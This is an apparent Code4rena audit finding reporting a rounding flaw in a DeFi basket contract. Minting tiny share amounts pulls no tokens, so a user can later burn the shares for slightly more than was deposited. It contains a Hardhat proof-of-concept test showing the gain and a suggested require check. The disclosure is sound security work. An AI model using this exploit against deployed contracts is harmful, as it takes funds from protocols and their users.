## Tags

- bug
- 2 (Med Risk)
- sponsor confirmed

# [User can mint miniscule amount of shares, later withdraw miniscule more than deposited](https://github.com/code-423n4/2021-09-defiprotocol-findings/issues/81) 

# Handle

kenzo


# Vulnerability details

If a user is minting small amount of shares (like 1 - amount depends on baskets weights), the calculated amount of tokens to pull from the user can be less than 1, and therefore no tokens will be pulled. However the shares would still be minted.
If the user does this a few times, he could then withdraw the total minted shares and end up with more tokens than he started with - although a miniscule amount.

## Impact
User can end up with more tokens than he started with. However, I didn't find a way for the user to get an amount to make this a feasible attack. He gets dust. However he can still get more than he deserves. If for some reason the basket weights grow in a substantial amount, this could give the user more tokens that he didn't pay for.

## Proof of Concept
Add the following test to Basket.test.js.
The user starts with 5e18 UNI, 1e18 COMP, 1e18 AAVE,
and ends with 5e18+4, 1e18+4, 1e18+4.
```
it("should give to user more than he deserves", async () => {
        await UNI.connect(owner).mint(ethers.BigNumber.from(UNI_WEIGHT).mul(1000000));
        await COMP.connect(owner).mint(ethers.BigNumber.from(COMP_WEIGHT).mul(1000000));
        await AAVE.connect(owner).mint(ethers.BigNumber.from(AAVE_WEIGHT).mul(1000000));
  
        await UNI.connect(owner).approve(basket.address, ethers.BigNumber.from(UNI_WEIGHT).mul(1000000));
        await COMP.connect(owner).approve(basket.address, ethers.BigNumber.from(COMP_WEIGHT).mul(1000000));
        await AAVE.connect(owner).approve(basket.address, ethers.BigNumber.from(AAVE_WEIGHT).mul(1000000));
  
        console.log("User balance before minting:");
        console.log("UNI balance: " + (await UNI.balanceOf(owner.address)).toString());
        console.log("COMP balance: " + (await COMP.balanceOf(owner.address)).toString());
        console.log("AAVE balance: " + (await AAVE.balanceOf(owner.address)).toString());

        
        await basket.connect(owner).mint(ethers.BigNumber.from(1).div(1));
        await basket.connect(owner).mint(ethers.BigNumber.from(1).div(1));
        await basket.connect(owner).mint(ethers.BigNumber.from(1).div(1));
        await basket.connect(owner).mint(ethers.BigNumber.from(1).div(1));
        await basket.connect(owner).mint(ethers.BigNumber.from(1).div(1));

        console.log("\nUser balance after minting 1 share 5 times:");
        console.log("UNI balance: " + (await UNI.balanceOf(owner.address)).toString());
        console.log("COMP balance: " + (await COMP.balanceOf(owner.address)).toString());
        console.log("AAVE balance: " + (await AAVE.balanceOf(owner.address)).toString());

        await basket.connect(owner).burn(await basket.balanceOf(owner.address));
        console.log("\nUser balance after burning all shares:");
        console.log("UNI balance: " + (await UNI.balanceOf(owner.address)).toString());
        console.log("COMP balance: " + (await COMP.balanceOf(owner.address)).toString());
        console.log("AAVE balance: " + (await AAVE.balanceOf(owner.address)).toString());
    });
```

## Tools Used
Manual analysis, hardhat.

## Recommended Mitigation Steps
Add a check to ```pullUnderlying```:
```
require(tokenAmount > 0);
```
I think it makes sense that if a user is trying to mint an amount so small that no tokens could be pulled from him, the mint request should be denied.
Per my tests, for an initial ibRatio, this number (the minimal amount of shares that can be minted) is 2 for weights in magnitude of 1e18, and if the weights are eg. smaller by 100, this number will be 101.

